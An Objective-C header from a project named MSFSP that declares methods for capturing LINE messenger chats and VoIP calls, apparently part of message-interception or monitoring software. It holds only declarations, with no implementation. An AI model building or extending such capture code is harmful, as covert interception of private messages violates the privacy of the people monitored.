//
//  LINEUtilsV2.h
//  MSFSP
//
//  Created by Makara Khloth on 8/20/15.
//
//

#import <Foundation/Foundation.h>

@class ManagedMessage, ManagedChat;

@interface LINEUtilsV2 : NSObject

+ (void) captureLINEVoIP: (id) aMessage
                    chat: (ManagedChat *) aChat
                outgoing: (BOOL) aOutgoing;
+ (void) captureLINEMessage: (ManagedMessage *) aMessage
                       chat: (ManagedChat *) aChat
                   outgoing: (BOOL) aOutgoing;

@end
